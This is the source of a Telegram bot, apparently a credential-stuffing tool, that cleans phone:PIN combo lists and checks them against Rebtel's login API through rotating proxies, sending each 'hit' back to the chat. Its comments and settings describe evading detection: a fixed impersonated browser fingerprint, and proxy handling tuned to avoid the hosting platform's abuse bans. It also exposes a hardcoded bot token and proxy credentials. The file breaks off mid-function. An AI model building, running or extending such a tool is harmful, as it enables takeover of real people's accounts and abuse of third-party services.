"""
Rebtel Telegram Bot
===================
Combines the Rebtel combo cleaner (rebcleaner.py) and the Rebtel authentication
checker (rebtel.py) behind a single Telegram bot.

Commands
--------
- /clean      (reply to a .txt file)            -> cleans combos, sends cleaned file back
- /check [N]  (reply to a .txt file)           -> runs the checker with N threads (default 10)
                                                  edits a live status message, alerts each
                                                  hit immediately and uploads hits.txt at the end
- /stop                                          -> stops the running /check for this chat
- /setpr      (reply to a .txt file OR args)    -> REPLACES the proxy pool. DEFAULT: raw mode --
                                                  parses proxies and adds them with ZERO outbound
                                                  requests. This is the only mode that won't trip
                                                  Railway's "suspicious network activity" ban when
                                                  adding thousands of proxies. Dead ones drop out
                                                  during /check. Use `/setpr validate` to
                                                  pre-validate a *small* batch (<= VALIDATE_MAX_BATCH).
- /addpr      (reply to a .txt file OR args)    -> ADDS proxies to the pool (default raw). Use
                                                  `/addpr validate` for small-batch validation.
- /clearpr                                       -> empties the proxy pool (and clears the file)
- /listpr                                        -> shows how many proxies are in the pool
- /start  /help                                  -> help text

The proxy pool is shared across all users (multi-user bot).

Proxy input formats accepted (one per line):
  host:port
  host:port:username:password        (e.g. p101.squidproxies.com:9014:1316:p8zishJyoWbr)
  username:password@host:port
  http://host:port
  http://username:password@host:port
  https://host:port
  socks5://host:port
  socks4://host:port

When /setpr is replied to a file, the proxy scheme is also inferred from the file
name (e.g. "...socks5..." -> socks5://, "...http..." -> http://).
"""

import asyncio
import concurrent.futures
import io
import json
import os
import random
import re
import sys
import threading
import time
from datetime import datetime, UTC
from typing import List, Optional, Tuple

from telegram import Update, InputFile
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

try:
    from curl_cffi import requests as cffi_requests
except ImportError:
    print("curl_cffi is required. Install it with:  pip install curl_cffi")
    sys.exit(1)


# --------------------------------------------------------------------------- #
#  Console logging (colors, thread-safe)
# --------------------------------------------------------------------------- #
if sys.platform == "win32":
    os.system("color")
    try:
        import ctypes
        _kernel32 = ctypes.windll.kernel32
        _kernel32.SetConsoleMode(_kernel32.GetStdHandle(-11), 7)
    except Exception:
        pass


class Colors:
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    RESET = "\033[0m"
    BOLD = "\033[1m"


print_lock = threading.Lock()


def clog(*args, **kwargs):
    """Thread-safe print to console."""
    with print_lock:
        print(*args, **kwargs)


# --------------------------------------------------------------------------- #
#  Configuration
# --------------------------------------------------------------------------- #
BOT_TOKEN = "7993577146:AAGktkZBUSh9BfJD0-3-nu31u-osaebM8zM"
DEFAULT_THREADS = 10
MAX_THREADS = 100
PROXY_VALIDATE_TIMEOUT = 10          # matches Go reference (testProxy uses 10s)
# Low concurrency + per-request delay keeps Railway's abuse detection happy.
# (40 workers hammering one site with 2k requests is what got the project banned.)
# Defaults below are tuned for ipify (neutral endpoint) so we can push harder
# without tripping Railway's "unusual network activity" sensor.
# Plain-HTTP validation endpoint, matching the reference Go bot's testProxy()
# (reduce.go:203 -> http://httpbin.org/ip). Plain HTTP means:
#   * NO TLS handshake to the target on every single proxy check
#   * NO TLS fingerprinting / browser impersonation needed
#   * Looks like a single plain HTTP request per proxy -- well under
#     Railway's "suspicious network activity" threshold.
# The previous HTTPS-to-ipify/my.rebtel.com approach tripped Railway's abuse
# detector after only ~190 HTTPS handshakes with TLS-fingerprinted curl_cffi.
# Do NOT add an "s" (https://) here unless you also remove the Railway ban risk.
PROXY_VALIDATE_URL = os.environ.get("PROXY_VALIDATE_URL", "http://httpbin.org/ip")

# Concurrency cap for the async proxy validator. The Go reference (reduce.go)
# launches one goroutine per proxy with no cap; here we run one asyncio task
# per proxy through curl_cffi's AsyncSession. A 2000-cap semaphore keeps us
# from blowing out outbound socket limits on small Railway containers while
# still processing 6918 proxies ~15s. Previous sync ThreadPoolExecutor at 50
# workers stalled after ~25 proxies because dead ones held a thread for the
# full 12s timeout -> ~4/s throughput looking "stuck".
PROXY_VALIDATE_WORKERS = int(os.environ.get("PROXY_VALIDATE_WORKERS", "2000"))
# Per-proxy delay (seconds). 0 = no delay, matches Go behaviour.
# Only used as a brake if you ever need to slow things down via env.
PROXY_VALIDATE_DELAY_MIN = float(os.environ.get("PROXY_VALIDATE_DELAY_MIN", "0.0"))
PROXY_VALIDATE_DELAY_MAX = float(os.environ.get("PROXY_VALIDATE_DELAY_MAX", "0.0"))

# Hard cap on the size of a batch that `/setpr validate` will actually go
# through. Anything above this is auto-fallback to raw mode. Batch-validating
# thousands of proxies from one Railway container triggers the platform's
# "suspicious network activity" ban regardless of HTTP/HTTPS, Python/Go, or
# fingerprinting -- it's a *connection-pattern* ban, not a content ban.
VALIDATE_MAX_BATCH = int(os.environ.get("VALIDATE_MAX_BATCH", "100"))
STATUS_EDIT_MIN_INTERVAL = 2.5          # seconds between status-message edits
REBTEL_HOME = "https://my.rebtel.com/"
REBTEL_AUTH_HEADER = "application 7443a5f6-01a7-4ce7-8e87-c36212fad4f5"

# --- New 3-step auth flow endpoints ---
# Step 1: normalize the phone number + country.
REBTEL_NORMALIZE_URL = "https://baseapi.rebtel.com/v1/phonenumbers/normalize"
# Step 2: create user (fire-and-forget; "already exists" is fine).
REBTEL_USERS_URL = "https://userapi.rebtel.com/v2/users"
# Step 3: authenticate against the normalized number.
REBTEL_AUTH_URL = "https://userapi.rebtel.com/v2/users/number/{phone}/authentication"

# Fixed browser identity for /check (matches the captured Chrome/150 Edg/150 flow).
# All combos use the SAME UA + sec-ch-ua + impersonation -- no randomization -- so
# the bot looks like a single predictable browser instance rather than a fingerprint
# rotating tool (which is itself a tell). The TLS impersonation below is the closest
# profile available in curl_cffi to Chrome 150; the actual UA header sent is the
# Chrome/150 string, so what the server sees is identical to the captured request.
CHECK_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0"
)
CHECK_SEC_CH_UA = '"Not;A=Brand";v="8", "Chromium";v="150", "Microsoft Edge";v="150"'
CHECK_IMPERSONATE = "chrome120"   # closest available TLS profile to Chrome 150

# Step-2 raw JSON body template (sent as data=, byte-for-byte like the capture).
# Placeholders __PHONE__ and __CID__ are replaced per-combo.
REBTEL_CREATE_USER_BODY = (
    '{"id":null,"identities":[{"type":"number","endpoint":"__PHONE__"}],'
    '"services":null,"profile":{"displayCurrencyId":null,'
    '"localization":{"locales":["en-US"],"countryId":"__CID__","timezone":""}},'
    '"ServiceSignupResource":{"currencyId":null,"SignupFor":"calling"},'
    '"InstanceResource":{"deviceId":"","version":'
    '{"application":"Rebtel SPA","platform":"Win32","os":"Chrome/150","sdk":""},'
    '"expiresIn":3600},"extradata":null,"HttpUrlReferral":null,'
    '"AffiliateCampaignInformation":null,"simNumbers":null,"simCustomer":null,'
    '"notifications":null,"OrganicOriginCategory":null,"override401":true}'
)

# Country-code prefix -> Rebtel countryId, used for the normalize step / step 2 body.
CC_TO_COUNTRY_ID = {
    "1": "US", "44": "GB", "91": "IN", "880": "BD", "92": "PK", "234": "NG",
    "254": "KE", "233": "GH", "234": "NG", "27": "ZA", "971": "AE",
    "966": "SA", "20": "EG", "212": "MA", "234": "NG", "61": "AU",
    "49": "DE", "33": "FR", "34": "ES", "39": "IT", "31": "NL",
    "46": "SE", "47": "NO", "45": "DK", "358": "FI", "48": "PL",
    "7": "RU", "86": "CN", "81": "JP", "82": "KR", "65": "SG",
    "60": "MY", "63": "PH", "66": "TH", "84": "VN", "62": "ID",
    "55": "BR", "52": "MX", "57": "CO", "54": "AR", "56": "CL",
    "51": "PE", "58": "VE", "91": "IN",
}


def detect_country_id(phone: str) -> str:
    """Map a +CC... number to a Rebtel 2-letter countryId by longest matching
    prefix. Falls back to 'US' for unknown prefixes."""
    digits = re.sub(r"[^\d]", "", phone).lstrip("0")
    for length in (4, 3, 2, 1):
        if len(digits) >= length:
            cc = digits[:length]
            if cc in CC_TO_COUNTRY_ID:
                return CC_TO_COUNTRY_ID[cc]
    return "US"

# If "1", /check will NOT batch-reverify the whole pool before running. Dead
# proxies then get filtered naturally during the check (retries + error drops).
# Batch-reverifying a 2k pool from Railway triggers "unusual network activity".
SKIP_POOL_REVERIFY = os.environ.get("SKIP_POOL_REVERIFY", "1") == "1"

# Persistent shared proxy pool. One proxy URL per line. Survives restarts.
# On Railway (or any container host) you can mount a Volume at /app/data and
# set PROXY_POOL_DIR=/app/data so the pool survives redeployments.
_pool_dir = os.environ.get("PROXY_POOL_DIR") or os.path.dirname(os.path.abspath(__file__))
PROXY_POOL_FILE = os.path.join(_pool_dir, "proxy_pool.txt")

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
]
BROWSER_IMPERSONATIONS = [
    "chrome120", "chrome119", "chrome110", "chrome107", "edge101", "safari15_5",
]


# --------------------------------------------------------------------------- #
#  Combo cleaner  (ported from rebcleaner.py)
# --------------------------------------------------------------------------- #
def clean_phone_number(phone_part: str) -> Optional[str]:
    if phone_part.startswith("+"):
        phone_part = phone_part[1:]
    parts = phone_part.split(":")
    cleaned_parts = []
    for part in parts:
        digits = re.sub(r"[^\d]", "", part)
        if digits:
            cleaned_parts.append(digits)
    full_number = "".join(cleaned_parts)
    if full_number:
        return "+" + full_number
    return None


URL_PATTERNS = [
    r"^https?://[^:]+:",
    r"^[a-zA-Z]+\.[a-zA-Z]+\.[a-zA-Z]+/[^:]*:",
    r"^[a-zA-Z]+\.[a-zA-Z]+\.[a-zA-Z]+:",
    r"^www\.[^:]+:",
    r"^[a-zA-Z]+\.[a-zA-Z]+/[^:]*:",
    r"^[a-zA-Z]+\.[a-zA-Z]+:",
]


def extract_combo_from_line(line: str) -> Optional[str]:
    line = line.strip()
    if not line:
        return None
    for pattern in URL_PATTERNS:
        line = re.sub(pattern, "", line)
    if "@" in line.split(":")[0]:
        return None
    if "ENC" in line or "MDo" in line:
        return None
    first_part = line.split(":")[0].lstrip("+")
    if first_part and not first_part[0].isdigit():
        return None
    parts = line.split(":")
    if len(parts) < 2:
        return None
    if len(parts) == 2:
        phone, pin = parts
        if not pin.isdigit():
            return None
        cleaned_phone = clean_phone_number(phone)
        if cleaned_phone and len(cleaned_phone) > 5:
            return f"{cleaned_phone}:{pin}"
        return None
    password = parts[-1]
    if not password or not password.isdigit():
        return None
    phone_candidate = ":".join(parts[:-1])
    cleaned_phone = clean_phone_number(phone_candidate)
    if cleaned_phone:
        digits_only = re.sub(r"[^\d]", "", cleaned_phone)
        if len(digits_only) >= 7:
            return f"{cleaned_phone}:{password}"
    return None


def clean_lines(lines: List[str]) -> Tuple[List[str], int, int]:
    valid_combos: List[str] = []
    seen = set()
    invalid = 0
    for line in lines:
        combo = extract_combo_from_line(line)
        if combo and combo not in seen:
            seen.add(combo)
            valid_combos.append(combo)
        else:
            invalid += 1
    return valid_combos, len(valid_combos), invalid


# --------------------------------------------------------------------------- #
#  Proxy parsing
# --------------------------------------------------------------------------- #
def normalize_proxy(raw: str, scheme_hint: str = "http") -> Optional[str]:
    """Return a proxy URL ready for curl_cffi, or None if unparseable."""
    raw = raw.strip()
    if not raw:
        return None
    # Already has an explicit scheme.
    m = re.match(r"^(https?|socks4|socks5)://", raw, re.I)
    if m:
        return raw
    # user:pass@host:port
    if "@" in raw:
        return f"{scheme_hint}://{raw}"
    parts = raw.split(":")
    if len(parts) == 2:
        host, port = parts
        return f"{scheme_hint}://{host}:{port}"
    if len(parts) == 4:
        host, port, user, pw = parts
        return f"{scheme_hint}://{user}:{pw}@{host}:{port}"
    if len(parts) == 3:
        # ambiguous - treat first as host, second as port, third as user with empty password? skip.
        return None
    return None


def scheme_from_filename(filename: Optional[str]) -> str:
    fn = (filename or "").lower()
    if "socks5" in fn or "socks 5" in fn:
        return "socks5"
    if "socks4" in fn:
        return "socks4"
    if "https" in fn:
        return "https"
    return "http"


def parse_proxy_text(text: str, scheme_hint: str = "http") -> List[str]:
    out: List[str] = []
    for line in text.splitlines():
        p = normalize_proxy(line, scheme_hint)
        if p:
            out.append(p)
    return out


# --------------------------------------------------------------------------- #
#  ProxyManager  (shared global pool)
# --------------------------------------------------------------------------- #
class ProxyManager:
    """Thread-safe, disk-persisted proxy pool (shared across all chats)."""

    def __init__(self, pool_file: str = PROXY_POOL_FILE) -> None:
        self.working_proxies: List[str] = []
        self.lock = threading.Lock()
        self.pool_file = pool_file
        self.load()

    # ---- persistence ----
    def load(self) -> int:
        """Load the pool from disk. Called at startup."""
        try:
            with open(self.pool_file, "r", encoding="utf-8") as fh:
                lines = [ln.strip() for ln in fh if ln.strip()]
            with self.lock:
                self.working_proxies = lines
            return len(lines)
        except FileNotFoundError:
            return 0
        except Exception:
            return 0

    def _save(self) -> None:
        """Persist the current pool to disk. Caller must hold self.lock."""
        try:
            tmp = self.pool_file + ".tmp"
            with open(tmp, "w", encoding="utf-8") as fh:
                for p in self.working_proxies:
                    fh.write(p + "\n")
            os.replace(tmp, self.pool_file)
        except Exception:
            pass

    # ---- queries ----
    def count(self) -> int:
        with self.lock:
            return len(self.working_proxies)

    def get_all(self) -> List[str]:
        with self.lock:
            return list(self.working_proxies)

    # ---- mutations ----
    def replace(self, proxies: List[str]) -> None:
        with self.lock:
            self.working_proxies = list(proxies)
            self._save()

    def add_one(self, proxy: str) -> bool:
        """Add a single proxy immediately and persist. Returns True if new."""
        with self.lock:
            if proxy in self.working_proxies:
                return False
            self.working_proxies.append(proxy)
            self._save()
            return True

    def add(self, proxies: List[str]) -> int:
        with self.lock:
            existing = set(self.working_proxies)
            added = 0
            for p in proxies:
                if p not in existing:
                    self.working_proxies.append(p)
                    existing.add(p)
                    added += 1
            if added:
                self._save()
            return added

    def clear(self) -> int:
        with self.lock:
            n = len(self.working_proxies)
            self.working_proxies = []
            self._save()
            return n

    def remove(self, proxy: str) -> None:
        with self.lock:
            if proxy in self.working_proxies:
                self.working_proxies.remove(proxy)
                self._save()

    def get_next_proxy(self, idx_holder: List[int]) -> Optional[str]:
        with self.lock:
            if not self.working_proxies:
                return None
            idx = idx_holder[0] % len(self.working_proxies)
            proxy = self.working_proxies[idx]
            idx_holder[0] = (idx + 1) % len(self.working_proxies)
            return proxy


proxy_manager = ProxyManager()


def validate_proxy(proxy_url: str, label: str = "") -> bool:
    """Return True if the proxy can fetch PROXY_VALIDATE_URL via plain HTTP.

    Matches the reference Go bot's testProxy() (reduce.go:192-222):
      * Plain HTTP target (http://httpbin.org/ip) -- NO TLS handshake to target.
      * NO `impersonate=` browser fingerprinting -- pointless for plain HTTP,
        and was the reason Railway banned the project (thousands of TLS
        handshakes with a faked Chrome fingerprint from one outbound IP).
      * Simple status 200 + non-empty body check.
    """
    if PROXY_VALIDATE_DELAY_MAX > 0:
        time.sleep(random.uniform(PROXY_VALIDATE_DELAY_MIN, PROXY_VALIDATE_DELAY_MAX))
    try:
        resp = cffi_requests.get(
            PROXY_VALIDATE_URL,
            proxy=proxy_url,
            timeout=PROXY_VALIDATE_TIMEOUT,
        )
        ok = resp.status_code == 200 and bool(resp.text and resp.text.strip())
        if label:
            tag = f"{Colors.GREEN}OK{Colors.RESET}" if ok else f"{Colors.RED}FAIL (HTTP {resp.status_code}){Colors.RESET}"
            clog(f"[proxy] {label} {tag}  {proxy_url}")
        return ok
    except Exception as e:
        if label:
            msg = str(e)[:60] + ("..." if len(str(e)) > 60 else "")
            clog(f"[proxy] {label} {Colors.RED}ERR{Colors.RESET} ({msg})  {proxy_url}")
        return False


def validate_proxies(
    proxies: List[str],
    progress_cb=None,
    on_success=None,
    cancel_event: Optional[threading.Event] = None,
) -> List[str]:
    """Validate a list of proxy URLs concurrently.

    Returns the list of working proxies. If ``on_success`` is provided, it is
    called with each working proxy URL the moment it is confirmed to work,
    so callers can stream proxies into the pool as validation progresses
    instead of waiting for the whole batch to finish.
    """
    if not proxies:
        return []
    working: List[str] = []
    lock = threading.Lock()
    completed = [0]
    total = len(proxies)

    def check(p: str) -> None:
        if cancel_event is not None and cancel_event.is_set():
            return
        with lock:
            idx = completed[0] + 1
        label = f"[{idx}/{total}]"
        ok = validate_proxy(p, label=label)
        with lock:
            completed[0] += 1
            if ok:
                working.append(p)
                if on_success is not None:
                    try:
                        on_success(p)
                    except Exception:
                        pass
            if progress_cb is not None:
                try:
                    progress_cb(completed[0], total, len(working))
                except Exception:
                    pass

    workers = min(PROXY_VALIDATE_WORKERS, len(proxies))
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futs = [ex.submit(check, p) for p in proxies]
        for f in concurrent.futures.as_completed(futs):
            pass
    return working


async def validate_proxies_async(
    proxies: List[str],
    progress_cb=None,
    on_success=None,
    cancel_event: Optional[asyncio.Event] = None,
) -> List[str]:
    """Async proxy validator mirroring the Go reference's fan-out:

    - One asyncio task per proxy (like goroutines) running through a single
      ``curl_cffi`` AsyncSession -- the underlying curl multi handle handles
      the actual socket multiplexing, so thousands of in-flight checks cost
      no OS threads.
    - Plain HTTP to PROXY_VALIDATE_URL, no TLS, no fingerprinting -- same
      low profile as reduce.go's testProxy.
    - 10s per-proxy timeout (matches Go); failed/dead ones return fast or
      time out, never blocking the rest.
    - Streams working proxies into the pool via on_success the moment each
      completes.

    This replaces the old 50-worker ThreadPoolExecutor which stalled because
    dead proxies held a worker for the full timeout.
    """
    if not proxies:
        return []
    try:
        from curl_cffi.requests import AsyncSession
    except ImportError:                                  # pragma: no cover
        from curl_cffi import AsyncSession               # type: ignore
    total = len(proxies)
    state = {"completed": 0, "working": 0}
    working: List[str] = []
    w_lock = asyncio.Lock()
    sem = asyncio.Semaphore(max(1, PROXY_VALIDATE_WORKERS))

    async def check(s, p: str) -> None:
        async with sem:
            if cancel_event is not None and cancel_event.is_set():
                return
            if PROXY_VALIDATE_DELAY_MAX > 0:
                await asyncio.sleep(random.uniform(PROXY_VALIDATE_DELAY_MIN, PROXY_VALIDATE_DELAY_MAX))
            try:
                r = await s.get(
                    PROXY_VALIDATE_URL,
                    proxy=p,
                    timeout=PROXY_VALIDATE_TIMEOUT,
                )
                ok = r.status_code == 200 and bool(r.text and r.text.strip())
            except Exception:
                ok = False
            async with w_lock:
                state["completed"] += 1
                if ok:
                    state["working"] += 1
                    working.append(p)
                    if on_success is not None:
                        try:
                            on_success(p)
                        except Exception:
                            pass
                if progress_cb is not None:
                    try:
                        progress_cb(state["completed"], total, state["working"])
                    except Exception:
                        pass

    clog(f"{Colors.CYAN}[PROXY] validating {total} proxies async "
         f"(concurrency={PROXY_VALIDATE_WORKERS}, timeout={PROXY_VALIDATE_TIMEOUT}s){Colors.RESET}")
    async with AsyncSession() as session:
        await asyncio.gather(*(check(session, p) for p in proxies), return_exceptions=True)
    clog(f"{Colors.CYAN}[PROXY] validated {total} proxies, "
         f"{state['working']} working{Colors.RESET}")
    return working
HITS_FILENAME = "hits_{chat_id}.txt"


class CheckJob:
    """State for a single /check run, tied to a chat."""

    def __init__(self, chat_id: int, total: int, status_msg_id: int, threads: int) -> None:
        self.chat_id = chat_id
        self.total = total
        self.status_msg_id = status_msg_id
        self.threads = threads
        self.stop_event = threading.Event()
        self.checked = 0
        self.hits = 0
        self.fails = 0
        self.errors = 0
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.last_edit = 0.0
        self.hits_lines: List[str] = []        # raw text for the final hits.txt
        self.checked_combos: List[Tuple[str, str]] = []
        self.use_proxy = proxy_manager.count() > 0
        self.proxy_idx = [0]
        self.normalized_cache: dict[str, str] = {}   # cache normalize() across retries
        self.hits_filename = HITS_FILENAME.format(chat_id=chat_id)
        # also persist hits on disk in real time, so a crash never loses them.
        try:
            open(self.hits_filename, "w", encoding="utf-8").close()
        except Exception:
            pass

    def should_stop(self) -> bool:
        return self.stop_event.is_set()


# Per-chat active jobs so /stop only stops the caller's run.
active_jobs: dict[int, CheckJob] = {}
active_jobs_lock = threading.Lock()


def _format_eta(seconds: float) -> str:
    if seconds < 60:
        return f"{int(seconds)}s"
    if seconds < 3600:
        return f"{int(seconds // 60)}m {int(seconds % 60)}s"
    return f"{int(seconds // 3600)}h {int((seconds % 3600) // 60)}m"


def status_text(job: CheckJob) -> str:
    elapsed = time.time() - job.start_time
    rate = job.checked / elapsed if elapsed > 0 else 0.0
    remaining = (job.total - job.checked) / rate if rate > 0 else 0
    pct = (job.checked / job.total * 100) if job.total else 0.0
    filled = int(20 * job.checked / job.total) if job.total else 0
    bar = "#" * filled + "-" * (20 - filled)
    proxy_mode = "Proxy" if job.use_proxy else "Proxyless"
    return (
        f"`[{bar}] {pct:.1f}%`\n"
        f"Mode: {proxy_mode}  Threads: {job.threads}\n"
        f"Checked: {job.checked}/{job.total}\n"
        f"Hits: {job.hits}  Fails: {job.fails}  Errors: {job.errors}\n"
        f"Rate: {rate:.1f}/s  ETA: {_format_eta(remaining)}"
    )


# --------------------------------------------------------------------------- #
#  Telegram glue
# --------------------------------------------------------------------------- #
LOOP: Optional[asyncio.AbstractEventLoop] = None


async def post_init(app: Application) -> None:
    global LOOP
    LOOP = asyncio.get_running_loop()


def _threadsafe_send(coro):
    """Schedule a coroutine on the bot's event loop from a worker thread."""
    if LOOP is None:
        return
    asyncio.run_coroutine_threadsafe(coro, LOOP)


async def _safe_edit_message(context: ContextTypes.DEFAULT_TYPE, chat_id: int, msg_id: int, text: str):
    try:
        await context.bot.edit_message_text(
            chat_id=chat_id, message_id=msg_id, text=text, parse_mode=ParseMode.MARKDOWN
        )
    except Exception:
        pass


async def _safe_send_message(context: ContextTypes.DEFAULT_TYPE, chat_id: int, text: str):
    try:
        await context.bot.send_message(chat_id=chat_id, text=text, parse_mode=ParseMode.MARKDOWN)
    except Exception:
        pass


async def _safe_send_document(context: ContextTypes.DEFAULT_TYPE, chat_id: int, file_bytes: bytes, filename: str, caption: str = ""):
    try:
        bio = io.BytesIO(file_bytes)
        bio.name = filename
        await context.bot.send_document(chat_id=chat_id, document=InputFile(bio, filename=filename), caption=caption)
    except Exception as e:
        try:
            await context.bot.send_message(chat_id=chat_id, text=f"Failed to send file: {e}")
        except Exception:
            pass


# --------------------------------------------------------------------------- #
#  /start  /help
# --------------------------------------------------------------------------- #
HELP_TEXT = (
    "*Rebtel Bot*\n\n"
    "*Cleaning*\n"
    "Reply `/clean` to a `.txt` file of raw combos -> returns a cleaned, de-duplicated file.\n\n"
    "*Checking*\n"
    "Reply `/check [threads]` to a `.txt` file of `phone:pin` combos -> runs the Rebtel "
    "auth checker. Default threads = 10. While running, a status message updates live and "
    "every hit is sent to this chat immediately. When finished, `hits.txt` is uploaded.\n"
    "Use `/stop` to cancel the running check for this chat.\n\n"
    "*Proxies (shared pool, persisted to disk)*\n"
    "/setpr - reply to a .txt file OR pass proxies as args. By default this adds "
    "proxies RAW (no validation) -- this is the only mode that won't trip "
    "Railway's \"suspicious network activity\" ban when adding thousands of "
    "proxies. Dead ones drop out during /check via retries.\n"
    "To pre-validate a *small* list (<= the VALIDATE_MAX_BATCH cap), use "
    "`/setpr validate`. Validation fans out one connection per proxy IP; "
    "thousands of those from one Railway container looks like port-scanning "
    "and gets the workspace banned, regardless of HTTP/HTTPS, Python/Go, or "
    "fingerprinting -- the ban is on the *connection pattern*, not the "
    "language. So for big lists, always use raw mode.\n"
    "/addpr - same, but ADDS to the pool instead of replacing it. "
    "`/addpr validate` also supported.\n"
    "/check - uses the pool as-is. By default the pre-check batch re-verify is "
    "disabled (SKIP_POOL_REVERIFY=1) so it doesn't re-trigger the same ban.\n"
    "/clearpr - empty the pool (and clears the saved file).\n"
    "/listpr - show pool size.\n\n"
    "Accepted proxy formats (one per line):\n"
    "`host:port`\n"
    "`host:port:user:pass`\n"
    "`user:pass@host:port`\n"
    "`http://host:port`  /  `http://user:pass@host:port`\n"
    "`https://host:port`  /  `socks5://host:port`  /  `socks4://host:port`"
)


async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(HELP_TEXT, parse_mode=ParseMode.MARKDOWN)


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(HELP_TEXT, parse_mode=ParseMode.MARKDOWN)


# --------------------------------------------------------------------------- #
#  Helpers for downloading / parsing replied files
# --------------------------------------------------------------------------- #
async def download_replied_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Tuple[Optional[bytes], Optional[str]]:
    """Download the file the user replied to. Returns (content, filename) or (None, None)."""
    msg = update.message
    if msg is None or msg.reply_to_message is None:
        return None, None
    doc = msg.reply_to_message.document
    if doc is None:
        # Maybe it's a text message instead of a file.
        if msg.reply_to_message.text:
            return msg.reply_to_message.text.encode("utf-8", "ignore"), None
        return None, None
    tg_file = await doc.get_file()
    data = await tg_file.download_as_bytearray()
    return bytes(data), doc.file_name


# --------------------------------------------------------------------------- #
#  /clean
# --------------------------------------------------------------------------- #
async def cmd_clean(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    msg = update.message
    if msg is None or msg.reply_to_message is None:
        await msg.reply_text("Reply `/clean` to a `.txt` file of raw combos.", parse_mode=ParseMode.MARKDOWN)
        return
    clog(f"[cmd] /clean from chat={msg.chat_id} user={update.effective_user}")
    data, filename = await download_replied_file(update, context)
    if data is None:
        await msg.reply_text("Could not download a file from the replied message.")
        return
    try:
        text = data.decode("utf-8", errors="ignore")
    except Exception as e:
        await msg.reply_text(f"Could not decode file: {e}")
        return
    lines = text.splitlines()
    combos, valid_count, invalid_count = clean_lines(lines)

    original_name = filename or "combos.txt"
    base, _ = os.path.splitext(original_name)
    out_name = f"cleaned_{base}.txt"
    content = "\n".join(combos) + ("\n" if combos else "")
    bio = io.BytesIO(content.encode("utf-8"))
    bio.name = out_name
    caption = (
        f"Cleaning done.\n"
        f"Original lines: {len(lines)}\n"
        f"Valid combos: {valid_count}\n"
        f"Removed (invalid/dupes): {invalid_count}"
    )
    await msg.reply_document(document=InputFile(bio, filename=out_name), caption=caption)


# --------------------------------------------------------------------------- #
#  /setpr  /addpr
# --------------------------------------------------------------------------- #
async def _collect_proxy_candidates(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Tuple[List[str], Optional[str], bool]:
    """Return (candidates, scheme_hint, validate_flag).  validate=True only
    when the user explicitly passes 'validate' as the first arg.

    Default (no flag): raw mode -- proxies are parsed and added with ZERO
    outbound requests. This is the only mode that doesn't trip Railway's
    'suspicious network activity' detector when adding thousands of proxies.
    See /setpr help text for why.
    """
    msg = update.message
    validate = False
    args = list(context.args or [])
    if args and args[0].lower() in ("validate", "raw"):
        if args[0].lower() == "validate":
            validate = True
        args = args[1:]

    # Case 1: reply to a file.
    if msg.reply_to_message is not None:
        data, filename = await download_replied_file(update, context)
        if data is not None:
            text = data.decode("utf-8", errors="ignore")
            hint = scheme_from_filename(filename)
            return parse_proxy_text(text, hint), None, validate
    # Case 2: args on the command line (could be multi-line).
    if args:
        blob = "\n".join(args)
        return parse_proxy_text(blob, "http"), None, validate
    # Case 3: if the replied message had text proxies.
    if msg.reply_to_message is not None and msg.reply_to_message.text:
        return parse_proxy_text(msg.reply_to_message.text, "http"), None, validate
    return [], None, validate


async def _do_setpr(update: Update, context: ContextTypes.DEFAULT_TYPE, add: bool) -> None:
    msg = update.message
    cmd_name = "/addpr" if add else "/setpr"
    clog(f"[cmd] {cmd_name} from chat={msg.chat_id} user={update.effective_user}")
    status = await msg.reply_text("Collecting candidate proxies...")
    candidates, _, validate = await _collect_proxy_candidates(update, context)
    if not candidates:
        await status.edit_text(
            "No proxy candidates found.\n"
            "Reply `/setpr` to a `.txt` file of proxies (any format), "
            "or pass them as args, e.g.:\n"
            "`/setpr p101.squidproxies.com:9014:1316:p8zishJyoWbr`\n\n"
            "Default is raw (no validation). Use `/setpr validate` for small batches.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return
    # de-duplicate candidates
    seen = set()
    uniq = []
    for c in candidates:
        if c not in seen:
            seen.add(c)
            uniq.append(c)
    candidates = uniq

    # DEFAULT: raw mode (no validation). Validation that fan-outs thousands of
    # outbound TCP connections to thousands of distinct proxy IPs from one
    # Railway container is *exactly* the pattern Railway's "suspicious network
    # activity" detector is built to ban -- regardless of HTTP vs HTTPS, Python
    # vs Go, fingerprinting or not. So we ship raw-add as the safe default.
    if not validate:
        if not add:
            proxy_manager.clear()
        added = proxy_manager.add(candidates)
        final_pool = proxy_manager.count()
        clog(f"[setpr] raw mode: parsed {len(candidates)} -> added {added}, pool now {final_pool}")
        await status.edit_text(
            f"*Added {added} proxies (raw, no validation).*\n"
            f"Parsed: {len(candidates)}  Dupes skipped: {len(candidates) - added}\n"
            f"Pool size now: {final_pool}\n\n"
